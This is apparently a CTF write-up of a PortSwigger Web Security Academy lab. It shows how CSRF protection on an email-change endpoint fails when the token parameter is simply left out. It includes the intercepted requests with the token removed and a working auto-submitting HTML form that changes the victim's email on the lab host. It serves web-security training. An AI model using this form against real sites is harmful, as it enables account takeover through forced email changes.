---
layout: post
title: "CSRF where token validation depends on the token being present"
date: 2026-10-12
series: PortSwigger CSRF
categories:
  - CTF
  - PortSwigger
tags:
  - CSRF
  - Web
---

## Description

This [lab](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present){:target="_blank"}'s email change functionality is vulnerable to CSRF.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

## Steps

Intercepting the change email request:

```http
POST /my-account/change-email HTTP/2
Host: 0ac600e50409b2ed80c7c67300750077.web-security-academy.net
Cookie: session=MZHQTtFGAn2Kzkmmh9DjKuJQUVxM2q9Y
Content-Length: 64
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="154", "Google Chrome";v="154", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36
Origin: https://0ac600e50409b2ed80c7c67300750077.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ac600e50409b2ed80c7c67300750077.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Sec-Gpc: 1
Priority: u=0, i

email=jawad1%40example.com&csrf=ga14V3VPrD7W2dFA4aY8M1XpGWHxGYSC
```

Removing the `csrf` parameter results in the backend skipping the check:

```http
POST /my-account/change-email HTTP/2
Host: 0ac600e50409b2ed80c7c67300750077.web-security-academy.net
Cookie: session=MZHQTtFGAn2Kzkmmh9DjKuJQUVxM2q9Y
Content-Length: 64
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="154", "Google Chrome";v="154", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36
Origin: https://0ac600e50409b2ed80c7c67300750077.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ac600e50409b2ed80c7c67300750077.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Sec-Gpc: 1
Priority: u=0, i

email=jawad2%40example.com
```

Exploiting the vulnerability via an HTML page:

```html
<h1>Lab03</h1>

<form method="POST" action="https://0ac600e50409b2ed80c7c67300750077.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="jawad4@example.com">
</form>

<script> document.forms[0].submit(); </script>
```
